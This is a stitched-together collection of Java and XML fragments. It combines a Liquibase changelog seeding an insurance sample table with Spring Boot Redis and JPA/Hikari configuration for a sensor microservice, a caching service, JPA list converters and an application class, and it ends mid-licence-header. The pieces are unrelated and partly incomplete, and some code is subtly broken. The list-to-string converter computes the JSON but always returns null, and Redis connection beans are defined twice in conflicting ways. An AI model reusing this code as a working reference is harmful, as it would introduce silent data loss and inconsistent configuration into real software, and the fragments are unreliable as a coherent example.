<?xml version="1.0" encoding="utf-8"?>
<databaseChangeLog
        xmlns="http://www.liquibase.org/xml/ns/dbchangelog"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://www.liquibase.org/xml/ns/dbchangelog
        http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-3.4.xsd">

    <property name="now" value="now()" dbms="mysql,h2"/>
    <property name="now" value="current_timestamp" dbms="postgresql"/>
    <property name="now" value="sysdate" dbms="oracle"/>

    <property name="autoIncrement" value="true" dbms="mysql,h2,postgresql,oracle"/>

    <property name="floatType" value="float4" dbms="postgresql, h2"/>
    <property name="floatType" value="float" dbms="mysql, oracle"/>

    <!-- Create table for example dataset -->
    <changeSet id="00001" author="hedza06" context="dev, prod">
        <createTable tableName="insurance">
            <column name="id" type="int" autoIncrement="${autoIncrement}">
                <constraints nullable="false" primaryKey="true" />
            </column>
            <column name="policyID" type="bigint">
                <constraints nullable="false" />
            </column>
            <column name="statecode" type="char(2)">
                <constraints nullable="false" />
            </column>
            <column name="county" type="varchar(64)">
                <constraints nullable="false" />
            </column>
            <column name="eq_site_limit" type="double">
                <constraints nullable="false" />
            </column>
            <column name="hu_site_limit" type="double">
                <constraints nullable="false" />
            </column>
            <column name="fl_site_limit" type="double">
                <constraints nullable="false" />
            </column>
            <column name="fr_site_limit" type="double">
                <constraints nullable="false" />
            </column>
            <column name="tiv_2011" type="double">
                <constraints nullable="false" />
            </column>
            <column name="tiv_2012" type="double">
                <constraints nullable="false" />
            </column>
            <column name="eq_site_deductible" type="double">
                <constraints nullable="false" />
            </column>
            <column name="hu_site_deductible" type="double">
                <constraints nullable="false" />
            </column>
            <column name="fl_site_deductible" type="double">
                <constraints nullable="false" />
            </column>
            <column name="fr_site_deductible" type="double">
                <constraints nullable="false" />
            </column>
            <column name="point_latitude" type="double">
                <constraints nullable="false" />
            </column>
            <column name="point_longitude" type="double">
                <constraints nullable="false" />
            </column>
            <column name="line" type="varchar(64)">
                <constraints nullable="false" />
            </column>
            <column name="construction" type="varchar(64)">
                <constraints nullable="false" />
            </column>
            <column name="point_granularity" type="int">
                <constraints nullable="false" />
            </column>
        </createTable>

        <!-- Load data from CSV -->
        <loadData encoding="UTF-8"
                  file="../seeds/FL_insurance_sample.csv"
                  separator=","
                  tableName="insurance"
                  relativeToChangelogFile="true"/>
    </changeSet>
</databaseChangeLog>

<?xml version="1.0" encoding="UTF-8"?>

<databaseChangeLog
        xmlns="http://www.liquibase.org/xml/ns/dbchangelog"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://www.liquibase.org/xml/ns/dbchangelog
        http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-3.0.xsd">

    <!-- Migrations -->
    <include file="migrations/dataset.xml" relativeToChangelogFile="true" />

</databaseChangeLog>
--------------------------------------------------------------------------------------------------------
  cache:
    type: REDIS
  redis:
    host: localhost
    port: 6379
    jedis:
      pool:
        max-active: 4
        max-idle: 51
        max-wait: 3000
        min-idle: 1
		
package com.siemens.microservices.sonarine.sensors.system.configuration;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.google.common.collect.ImmutableSet;
import com.siemens.microservices.sonarine.sensors.system.properties.JedisProperties;
import com.siemens.microservices.sonarine.sensors.system.properties.RedisProperties;
import edu.emory.mathcs.backport.java.util.Collections;
import lombok.AccessLevel;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import org.springframework.cache.annotation.CachingConfigurerSupport;
import org.springframework.cache.interceptor.KeyGenerator;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.redis.connection.RedisConnectionFactory;
import org.springframework.data.redis.connection.RedisSentinelConfiguration;
import org.springframework.data.redis.connection.RedisStandaloneConfiguration;
import org.springframework.data.redis.connection.jedis.JedisConnectionFactory;
import org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.data.redis.repository.configuration.EnableRedisRepositories;
import org.springframework.data.redis.serializer.Jackson2JsonRedisSerializer;
import org.springframework.data.redis.serializer.RedisSerializer;
import org.springframework.data.redis.serializer.StringRedisSerializer;
import redis.clients.jedis.JedisPoolConfig;

import javax.annotation.PreDestroy;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.Optional;

/**
 * Redis configuration
 */
@Configuration
@RequiredArgsConstructor
@Getter(AccessLevel.PROTECTED)
@EnableRedisRepositories
public class RedisConfiguration extends CachingConfigurerSupport {

    /**
     * Default redis properties
     */
    private final RedisProperties redisProperties;
    /**
     * Default jedis properties
     */
    private final JedisProperties jedisProperties;

    @Bean
    @Override
    public KeyGenerator keyGenerator() {
        return (target, method, params) -> {
            final StringBuilder sb = new StringBuilder();
            sb.append(target.getClass().getName());
            sb.append(method.getName());
            Arrays.stream(Optional.ofNullable(params).orElseGet(() -> new Object[0])).forEach(sb::append);
            return sb.toString();
        };
    }

    @Bean
    public StringRedisTemplate stringRedisTemplate(final ObjectMapper mapper) {
        final StringRedisTemplate template = new StringRedisTemplate(jedisConnectionFactory());
        template.setEnableTransactionSupport(true);
        template.setValueSerializer(this.valueSerializer(mapper));
        template.afterPropertiesSet();
        return template;
    }

    @Bean
    public RedisTemplate<?, ?> redisTemplate(final ObjectMapper mapper) {
        final RedisTemplate<String, Object> template = new RedisTemplate<>();
        template.setEnableTransactionSupport(true);
        template.setConnectionFactory(this.jedisConnectionFactory());
        template.setKeySerializer(this.keySerializer());
        template.setHashKeySerializer(this.keySerializer());
        template.setHashValueSerializer(this.keySerializer());
//        template.setValueSerializer(new GenericJackson2JsonRedisSerializer());
        template.setValueSerializer(this.valueSerializer(mapper));
        template.afterPropertiesSet();
        return template;
    }

    @Bean
    public RedisSerializer<String> keySerializer() {
        return new StringRedisSerializer();
    }

    @Bean
    public RedisSerializer<Object> valueSerializer(final ObjectMapper mapper) {
        final Jackson2JsonRedisSerializer<Object> jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer<>(Object.class);
        jackson2JsonRedisSerializer.setObjectMapper(mapper);
        return jackson2JsonRedisSerializer;
    }

    @Bean
    public JedisPoolConfig jedisConfig() {
        final JedisPoolConfig jedisPoolConfig = new JedisPoolConfig();
        jedisPoolConfig.setMaxIdle(this.getJedisProperties().getMaxIdle());
        jedisPoolConfig.setMinIdle(this.getJedisProperties().getMinIdle());
        jedisPoolConfig.setMaxWaitMillis(this.getJedisProperties().getMaxWaitMillis());
        jedisPoolConfig.setMaxTotal(this.getJedisProperties().getMaxTotal());
        jedisPoolConfig.setTestOnBorrow(this.getJedisProperties().isTestOnBorrow());
        jedisPoolConfig.setTestOnReturn(this.getJedisProperties().isTestOnReturn());
        jedisPoolConfig.setTestWhileIdle(this.getJedisProperties().isTestWhileIdle());
        return jedisPoolConfig;
    }

    @Bean
    public RedisStandaloneConfiguration redisStandaloneConfig() {
        return new RedisStandaloneConfiguration(this.getRedisProperties().getHostName(), this.getRedisProperties().getPort());
    }

//    public RedisStandaloneConfiguration redisStandaloneConfig(final org.springframework.boot.autoconfigure.data.redis.RedisProperties redisProperties) {
//        return new RedisStandaloneConfiguration(redisProperties.getHost(), redisProperties.getPort());
//    }

    @Bean
    public RedisSentinelConfiguration redisSentinelConfig() {
        final RedisSentinelConfiguration configuration = new RedisSentinelConfiguration();
        configuration.master(this.getRedisProperties().getMaster());
        final List<Map<String, Integer>> hosts = Optional.ofNullable(this.getRedisProperties().getHosts()).orElseGet(Collections::emptyList);
        for (final Map<String, Integer> host : hosts) {
            host.forEach((String h, Integer p) -> configuration.sentinel(h, p));
        }
        return configuration;
    }

//    public RedisSentinelConfiguration redisSentinelConfig(final org.springframework.boot.autoconfigure.data.redis.RedisProperties redisProperties) {
//        return new RedisSentinelConfiguration(redisProperties.getSentinel().getMaster(), ImmutableSet.copyOf(redisProperties.getSentinel().getNodes()));
//    }

//    protected <K, V> RedisTemplate<K, V> getRedisTemplate() {
//        return this.getRedisTemplate(this.lettuceConnectionFactory(this.getRedisProperties()));
//    }

    @Bean(destroyMethod = "destroy")
    public JedisConnectionFactory jedisConnectionFactory() {
//        return new JedisConnectionFactory(this.redisSentinelConfig(), this.jedisConfig());
        return new JedisConnectionFactory(this.redisStandaloneConfig());
    }

    @Bean(destroyMethod = "destroy")
    public LettuceConnectionFactory lettuceConnectionFactory() {
        final LettuceConnectionFactory lettuceConnectionFactory = new LettuceConnectionFactory(this.redisStandaloneConfig());
//        final LettuceConnectionFactory lettuceConnectionFactory = new LettuceConnectionFactory(this.redisSentinelConfig());
//        lettuceConnectionFactory.getStandaloneConfiguration().setHostName(this.getRedisProperties().getHostName());
//        lettuceConnectionFactory.getStandaloneConfiguration().setPort(this.getRedisProperties().getPort());
        return lettuceConnectionFactory;
    }

//    @Bean(destroyMethod = "destroy")
//    public LettuceConnectionFactory lettuceConnectionFactory(final org.springframework.boot.autoconfigure.data.redis.RedisProperties redisProperties) {
//        if (Objects.isNull(redisProperties.getSentinel())) {
//            return new LettuceConnectionFactory(this.redisStandaloneConfig(redisProperties));
//        }
//        return new LettuceConnectionFactory(this.redisSentinelConfig(redisProperties));
//    }

    protected <K, V> RedisTemplate<K, V> getRedisTemplate(final RedisConnectionFactory connectionFactory) {
        final RedisTemplate<K, V> template = new RedisTemplate<>();
        template.setConnectionFactory(connectionFactory);
        template.afterPropertiesSet();
        return template;
    }

    @PreDestroy
    public void flushDb() {
        this.jedisConnectionFactory().getConnection().flushDb();
//        this.lettuceConnectionFactory().getConnection().flushDb();
    }
}


        <!-- Spring Data Redis library dependencies -->
        <dependency>
            <groupId>org.springframework.data</groupId>
            <artifactId>spring-data-redis</artifactId>
            <version>${spring-data-redis.version}</version>
        </dependency>
        <dependency>
            <groupId>redis.clients</groupId>
            <artifactId>jedis</artifactId>
            <version>${jedis.version}</version>
        </dependency>
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-pool2</artifactId>
            <version>${commons-pool2.version}</version>
        </dependency>
		
		       <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-cache</artifactId>
            <version>${spring-boot-starter.version}</version>
        </dependency>
		
		
		
package com.siemens.microservices.sonarine.sensors.system.configuration;

import com.zaxxer.hikari.HikariConfig;
import com.zaxxer.hikari.HikariDataSource;
import lombok.AccessLevel;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import org.hibernate.cache.ehcache.ConfigSettings;
import org.springframework.beans.factory.config.BeanPostProcessor;
import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;
import org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;
import org.springframework.boot.autoconfigure.condition.SearchStrategy;
import org.springframework.boot.autoconfigure.jmx.ParentAwareNamingStrategy;
import org.springframework.boot.autoconfigure.orm.jpa.HibernatePropertiesCustomizer;
import org.springframework.cache.jcache.JCacheCacheManager;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;
import org.springframework.context.annotation.PropertySource;
import org.springframework.core.env.Environment;
import org.springframework.dao.annotation.PersistenceExceptionTranslationPostProcessor;
import org.springframework.data.jpa.repository.config.EnableJpaAuditing;
import org.springframework.data.r2dbc.repository.config.EnableR2dbcRepositories;
import org.springframework.jmx.export.annotation.AnnotationJmxAttributeSource;
import org.springframework.jmx.export.naming.ObjectNamingStrategy;
import org.springframework.orm.hibernate5.LocalSessionFactoryBean;
import org.springframework.orm.jpa.*;
import org.springframework.orm.jpa.persistenceunit.DefaultPersistenceUnitManager;
import org.springframework.orm.jpa.persistenceunit.PersistenceUnitManager;
import org.springframework.orm.jpa.support.PersistenceAnnotationBeanPostProcessor;
import org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter;
import org.springframework.scheduling.annotation.EnableAsync;
import org.springframework.transaction.PlatformTransactionManager;
import org.springframework.transaction.annotation.EnableTransactionManagement;
import org.springframework.transaction.support.TransactionTemplate;

import javax.sql.DataSource;
import java.util.Properties;
import java.util.UUID;

import static com.siemens.microservices.sonarine.sensors.utility.StringUtils.getString;
import static org.hibernate.cfg.AvailableSettings.*;

@Configuration
@RequiredArgsConstructor
@Getter(AccessLevel.PROTECTED)
@EnableAsync
@EnableJpaAuditing
@EnableTransactionManagement
//@EnableJdbcRepositories(
//    basePackages = {
//        "com.siemens.microservices.sonarine.sensors.model",
//        "com.siemens.microservices.sonarine.sensors.repository"
//    }
//)
//@EnableJpaRepositories(
//    basePackages = {
//        "com.siemens.microservices.sonarine.sensors.model",
//        "com.siemens.microservices.sonarine.sensors.repository"
//    }
//)
@EnableR2dbcRepositories(
    basePackages = {
        "com.siemens.microservices.sonarine.sensors.model",
        "com.siemens.microservices.sonarine.sensors.repository"
    }
)
@PropertySource("classpath:application.yml")
public class DBConfiguration {

    /**
     * Default model/repository source packages
     */
    public static final String DEFAULT_REPOSITORY_PACKAGE = "com.siemens.microservices.sonarine.sensors.repository";
    public static final String DEFAULT_MODEL_PACKAGE = "com.siemens.microservices.sonarine.sensors.model";
    /**
     * Default persistence unit name
     */
    public static final String DEFAULT_PERSISTENCE_UNIT_NAME = "local";
    /**
     * Default domain name prefix
     */
    public static final String DEFAULT_DOMAIN_NAME_PREFIX = "domain_";
    /**
     * Default hibernate property names
     */
    public static final String EJB_NAMING_STRATEGY = "hibernate.ejb.naming_strategy";
    public static final String TEMP_USE_JDBC_METADATA_DEFAULTS = "hibernate.temp.use_jdbc_metadata_defaults";
    public static final String USE_UNICODE = "hibernate.connection.useUnicode";
    public static final String CHARSET = "hibernate.connection.charSet";
    public static final String CHARACTER_ENCODING = "hibernate.connection.characterEncoding";

    /**
     * Default {@link Environment} instance
     */
    private final Environment environment;

    /**
     * Returns {@link LocalContainerEntityManagerFactoryBean} configuration
     *
     * @return {@link LocalContainerEntityManagerFactoryBean} configuration
     */
    @Bean
    @Primary
    @ConditionalOnMissingBean
    public LocalContainerEntityManagerFactoryBean entityManagerFactory(final DataSource dataSource) {
        final LocalContainerEntityManagerFactoryBean factoryBean = new LocalContainerEntityManagerFactoryBean();
        factoryBean.setDataSource(dataSource);
        factoryBean.setJpaVendorAdapter(this.jpaVendorAdapter());
        factoryBean.setJpaProperties(this.jpaProperties());
        factoryBean.setJpaDialect(this.jpaDialect());
        factoryBean.setPackagesToScan(DEFAULT_REPOSITORY_PACKAGE, DEFAULT_MODEL_PACKAGE);
        factoryBean.setPersistenceUnitName(DEFAULT_PERSISTENCE_UNIT_NAME);
        return factoryBean;
    }

//    @Bean
//    public DataSource dataSource() {
//        EmbeddedDatabaseBuilder builder = new EmbeddedDatabaseBuilder();
//        EmbeddedDatabase db = builder.setType(EmbeddedDatabaseType.H2).addScript("schema-expressions.sql").addScript("data-expressions.sql").build();
//        return db;
//    }

    /**
     * Returns spring datasource {@link Properties} properties
     *
     * @return spring datasource {@link Properties} properties
     */
    @Bean
    public Properties dataSourceProperties() {
        final Properties properties = new Properties();
        return properties;
    }

    @Bean
    public HibernatePropertiesCustomizer hibernateSecondLevelCacheCustomizer(final JCacheCacheManager cacheManager) {
        return (properties) -> properties.put(ConfigSettings.CACHE_MANAGER, cacheManager.getCacheManager());
    }

    /**
     * Returns default {@link DataSource} configuration
     *
     * @return default {@link DataSource} configuration
     */
    @Bean(name = "dataSource", destroyMethod = "close")
    @ConditionalOnProperty(prefix = "spring.datasource", name = "url", havingValue = "false", matchIfMissing = true)
    public HikariDataSource dataSource() {
        final HikariConfig dataSourceConfig = new HikariConfig();
        dataSourceConfig.setDriverClassName(this.getEnvironment().getRequiredProperty("spring.datasource.driver-class-name"));
        dataSourceConfig.setJdbcUrl(this.getEnvironment().getRequiredProperty("spring.datasource.url"));
        dataSourceConfig.setUsername(this.getEnvironment().getRequiredProperty("spring.datasource.username"));
        dataSourceConfig.setPassword(this.getEnvironment().getRequiredProperty("spring.datasource.password"));
        dataSourceConfig.setConnectionTestQuery(this.getEnvironment().getRequiredProperty("spring.datasource.connectionTestQuery"));
        dataSourceConfig.setMinimumIdle(this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.hikari.minimumIdle", Integer.class));
        dataSourceConfig.setMaximumPoolSize(this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.hikari.maximumPoolSize", Integer.class));
        dataSourceConfig.setIdleTimeout(this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.hikari.idleTimeout", Integer.class));
        dataSourceConfig.setIsolateInternalQueries(this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.hikari.isolateInternalQueries", Boolean.class));
        dataSourceConfig.setDataSourceProperties(this.dataSourceProperties());
        return new HikariDataSource(dataSourceConfig);
    }

    /**
     * Returns {@link JpaVendorAdapter} configuration
     *
     * @return {@link JpaVendorAdapter} configuration
     */
    @Bean
    @ConditionalOnMissingBean
    public JpaVendorAdapter jpaVendorAdapter() {
        final HibernateJpaVendorAdapter jpaVendorAdapter = new HibernateJpaVendorAdapter();
        jpaVendorAdapter.setGenerateDdl(this.getEnvironment().getRequiredProperty("spring.datasource.jpa.generateDdl", Boolean.class));
        jpaVendorAdapter.setShowSql(this.getEnvironment().getRequiredProperty("spring.datasource.jpa.showSql", Boolean.class));
        jpaVendorAdapter.setDatabasePlatform(this.getEnvironment().getRequiredProperty("spring.datasource.databasePlatform"));
        return jpaVendorAdapter;
    }

    @Bean
    public JpaTransactionManager transactionManager(final LocalContainerEntityManagerFactoryBean entityManagerFactory) {
        final JpaTransactionManager transactionManager = new JpaTransactionManager();
        transactionManager.setEntityManagerFactory(entityManagerFactory.getObject());
        return transactionManager;
    }

//    /**
//     * Returns {@link HibernateTransactionManager} configuration by initial {@link SessionFactory} instance
//     *
//     * @param sessionFactory - initial {@link SessionFactory} instance
//     * @return {@link HibernateTransactionManager} configuration
//     */
//    @Bean
//    public HibernateTransactionManager transactionManager(final SessionFactory sessionFactory) {
//        final HibernateTransactionManager txManager = new HibernateTransactionManager();
//        txManager.setSessionFactory(sessionFactory);
//        return txManager;
//    }

    @Bean
    @Primary
    public TransactionTemplate transactionTemplate(final PlatformTransactionManager transactionManager) {
        return new TransactionTemplate(transactionManager);
    }

    /**
     * Returns {@link ParentAwareNamingStrategy} configuration
     *
     * @return {@link ParentAwareNamingStrategy} configuration
     */
    @Bean
    @ConditionalOnMissingBean(value = ObjectNamingStrategy.class, search = SearchStrategy.CURRENT)
    public ParentAwareNamingStrategy objectNamingStrategy() {
        final ParentAwareNamingStrategy namingStrategy = new ParentAwareNamingStrategy(new AnnotationJmxAttributeSource());
        namingStrategy.setDefaultDomain(getString(DEFAULT_DOMAIN_NAME_PREFIX, UUID.randomUUID().toString()));
        return namingStrategy;
    }

    /**
     * Returns jpa {@link Properties} configuration
     *
     * @return jpa {@link Properties} configuration
     */
    @Bean
    public Properties jpaProperties() {
        final Properties jpaProperties = new Properties();
        // connection properties
        jpaProperties.put(POOL_SIZE, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.connection.corePoolSize"));
        jpaProperties.put(AUTOCOMMIT, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.connection.autocommit"));
        jpaProperties.put(USE_UNICODE, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.connection.useUnicode"));
        jpaProperties.put(CHARSET, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.connection.charSet"));
        jpaProperties.put(CHARACTER_ENCODING, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.connection.characterEncoding"));
        // general properties
        jpaProperties.put(DIALECT, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.dialect"));
        jpaProperties.put(CURRENT_SESSION_CONTEXT_CLASS, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.currentSessionContextClass"));
        jpaProperties.put(HBM2DDL_AUTO, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.hbm2ddl.auto"));
        jpaProperties.put(DEFAULT_SCHEMA, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.hbm2ddl.defaultSchema"));
        //jpaProperties.put(HBM2DDL_IMPORT_FILES, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.hbm2ddl.importFiles"));
        jpaProperties.put(EJB_NAMING_STRATEGY, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.ejb.namingStrategy"));
        jpaProperties.put(SHOW_SQL, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.showSql"));
        jpaProperties.put(FORMAT_SQL, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.formatSql"));
        jpaProperties.put(USE_SQL_COMMENTS, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.useSqlComments"));
        jpaProperties.put(ENABLE_LAZY_LOAD_NO_TRANS, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.enableLazyLoadNoTrans"));
        jpaProperties.put(MAX_FETCH_DEPTH, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.maxFetchDepth"));
        jpaProperties.put(DEFAULT_BATCH_FETCH_SIZE, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.defaultBatchFetchSize"));
        jpaProperties.put(GENERATE_STATISTICS, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.generateStatistics"));
        jpaProperties.put(GLOBALLY_QUOTED_IDENTIFIERS, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.globallyQuotedIdentifiers"));
        jpaProperties.put(USE_NEW_ID_GENERATOR_MAPPINGS, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.id.newGeneratorMappings"));
        jpaProperties.put(FLUSH_BEFORE_COMPLETION, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.transaction.flushBeforeCompletion"));
        jpaProperties.put(AUTO_CLOSE_SESSION, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.transaction.autoCloseSession"));
        jpaProperties.put(MERGE_ENTITY_COPY_OBSERVER, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.event.merge.entityCopyObserver"));
        jpaProperties.put(USE_REFLECTION_OPTIMIZER, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.bytecode.useReflectionOptimizer"));
        jpaProperties.put(TEMP_USE_JDBC_METADATA_DEFAULTS, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.temp.useJdbcMetadataDefaults"));
        // jdbc properties
        jpaProperties.put(STATEMENT_FETCH_SIZE, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.jdbc.fetchSize"));
        jpaProperties.put(STATEMENT_BATCH_SIZE, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.jdbc.batchSize"));
        jpaProperties.put(BATCH_VERSIONED_DATA, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.jdbc.batchVersionedData"));
        jpaProperties.put(ORDER_INSERTS, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.orderInserts"));
        jpaProperties.put(ORDER_UPDATES, this.getEnvironment().getRequiredProperty("spring.datasource.hibernate.orderUpdates"));
        return jpaProperties;
    }

    /**
     * Returns {@link JpaDialect} configuration
     *
     * @return {@link JpaDialect} configuration
     */
    @Bean
    public JpaDialect jpaDialect() {
        return new DefaultJpaDialect();
    }

    /**
     * Returns {@link PersistenceExceptionTranslationPostProcessor} configuration
     *
     * @return {@link PersistenceExceptionTranslationPostProcessor} configuration
     */
    @Bean
    public PersistenceExceptionTranslationPostProcessor exceptionTranslation() {
        return new PersistenceExceptionTranslationPostProcessor();
    }

    /**
     * Returns {@link PersistenceUnitManager} configuration
     *
     * @return {@link PersistenceUnitManager} configuration
     */
    @Bean
    public PersistenceUnitManager persistenceUnitManager(final DataSource dataSource) {
        final DefaultPersistenceUnitManager manager = new DefaultPersistenceUnitManager();
        manager.setDefaultDataSource(dataSource);
        manager.setDefaultPersistenceUnitName(DEFAULT_PERSISTENCE_UNIT_NAME);
        return manager;
    }

    /**
     * Returns {@link BeanPostProcessor} configuration
     *
     * @return {@link BeanPostProcessor} configuration
     */
    @Bean
    public BeanPostProcessor postProcessor() {
        final PersistenceAnnotationBeanPostProcessor postProcessor = new PersistenceAnnotationBeanPostProcessor();
        postProcessor.setDefaultPersistenceUnitName(DEFAULT_PERSISTENCE_UNIT_NAME);
        return postProcessor;
    }

    /**
     * Returns {@link LocalSessionFactoryBean} configuration
     *
     * @return {@link LocalSessionFactoryBean} configuration
     */
    @Bean
    public LocalSessionFactoryBean sessionFactory(final DataSource dataSource) {
        final LocalSessionFactoryBean sessionFactory = new LocalSessionFactoryBean();
        sessionFactory.setDataSource(dataSource);
        sessionFactory.setPackagesToScan(DEFAULT_REPOSITORY_PACKAGE, DEFAULT_MODEL_PACKAGE);
        sessionFactory.setHibernateProperties(this.jpaProperties());
        return sessionFactory;
    }
}



package com.siemens.microservices.sonarine.sensors.service.impl;

import com.siemens.microservices.sonarine.sensors.service.interfaces.CachingService;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.cache.CacheManager;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.util.Objects;

/**
 * Cache service implementation
 */
@Slf4j
@Service(CachingService.SERVICE_ID)
@RequiredArgsConstructor
@Transactional(rollbackFor = Exception.class)
public class CachingServiceImpl implements CachingService {

    private final CacheManager cacheManager;

    @Override
    public void put(final String cacheName, final String key, final String value) {
        this.cacheManager.getCache(cacheName).put(key, value);
    }

    @Override
    public String get(final String cacheName, final String key) {
        if (Objects.nonNull(this.cacheManager.getCache(cacheName).get(key))) {
            return cacheManager.getCache(cacheName).get(key).get().toString();
        }
        return null;
    }

    @Override
    public void evictSingleCacheValue(final String cacheName, final String cacheKey) {
        this.cacheManager.getCache(cacheName).evict(cacheKey);
    }

    @Override
    public void evictAll(final String cacheName) {
        this.cacheManager.getCache(cacheName).clear();
    }

    @Override
    public void evictAllCaches() {
        this.cacheManager.getCacheNames()
            .parallelStream()
            .forEach(cacheName -> this.cacheManager.getCache(cacheName).clear());
    }

    @Scheduled(fixedRateString = "${cron.cache.period.fixedRate:50000}")
    public void evictAllByInterval() {
        this.evictAllCaches();
    }
}



/**
 * Caching service declaration
 */
public interface CachingService {

    /**
     * Default service ID
     */
    String SERVICE_ID = "cachingService";

    void put(final String cacheName, final String key, final String value);

    String get(final String cacheName, final String key);

    void evictSingleCacheValue(final String cacheName, final String cacheKey);

    void evictAll(final String cacheName);

    void evictAllCaches();
}


import org.springframework.core.annotation.AliasFor;
import org.springframework.stereotype.Component;

import javax.persistence.Converter;
import java.lang.annotation.*;

@Documented
@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
@Component
@Converter
public @interface ConverterComponent {

    /**
     * The value may indicate a suggestion for a logical component name, to be turned into
     * a Spring bean in case of an autodetected component.
     *
     * @return the component name
     */
    @AliasFor(annotation = Component.class)
    String value() default "";

}



import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;
import edu.emory.mathcs.backport.java.util.Collections;
import lombok.AccessLevel;
import lombok.Getter;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;

import javax.persistence.AttributeConverter;
import java.io.IOException;
import java.util.List;
import java.util.Optional;

/**
 * {@link AttributeConverter} implementation for input {@link Iterable} collection
 */
@Slf4j
@Getter(AccessLevel.PROTECTED)
public class BaseListToStringConverter<T extends Iterable<?>> implements AttributeConverter<T, String> {

    @Autowired
    private ObjectMapper mapper;

    /**
     * Returns string representation by input {@link Iterable} collection of items
     *
     * @param attribute - initial input {@link Iterable} collection of items
     * @return {@link Iterable} string representation
     */
    @Override
    public String convertToDatabaseColumn(final T attribute) {
        try {
            this.getMapper().writeValueAsString(Optional.ofNullable(attribute).orElseGet(() -> (T) Collections.emptyList()));
        } catch (JsonProcessingException e) {
            log.error("ERROR: cannot process input products={}", StringUtils.join(attribute, "|"));
        }
        return null;
    }

    /**
     * Returns {@link Iterable} collection of items by input source {@link String}
     *
     * @param source - initial input source {@link String}
     * @return {@link Iterable} collection of items
     */
    @Override
    public T convertToEntityAttribute(final String source) {
        try {
            return this.getMapper().reader().forType(new TypeReference<List<T>>() {
            }).readValue(source);
        } catch (IOException e) {
            log.error("ERROR: cannot process input source={}", source);
        }
        return (T) Collections.emptyList();
    }
}



import com.siemens.microservices.sonarine.sensors.annotation.ConverterComponent;
import com.siemens.microservices.sonarine.sensors.model.dto.domain.MetricsRecordViewEntity;

import java.util.List;

/**
 * {@link BaseListToStringConverter} implementation for collection of {@link MetricsRecordViewEntity}
 */
@ConverterComponent
public class MetricsRecordsToStringConverter extends BaseListToStringConverter<List<MetricsRecordViewEntity>> {
}


@SpringBootApplication
@EnableTransactionManagement
@EnableCaching
@EnableScheduling
@EnableAsync
public class Application {

    String redisHost = "localhost";
    int redisPort = 6379;

    public static void main(String[] args) {
        SpringApplication.run(Application.class, args);
    }
    @Bean
    JedisConnectionFactory jedisConnectionFactory() {
        JedisConnectionFactory factory = new JedisConnectionFactory();
        factory.setHostName(redisHost);
        factory.setPort(redisPort);
        factory.setUsePool(true);
        return factory;
    }
    @Bean
    RedisTemplate<Object, Object> redisTemplate() {
        RedisTemplate<Object, Object> redisTemplate = new RedisTemplate<Object, Object>();
        redisTemplate.setConnectionFactory(jedisConnectionFactory());
        return redisTemplate;
    }
    @Bean
    public CacheManager cacheManager() {
        RedisCacheManager cacheManager = new RedisCacheManager(redisTemplate());
        return cacheManager;
    }
}


cacheManager.setUsePrefix(true)


/*
 * Copyright 2017 the original author or authors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
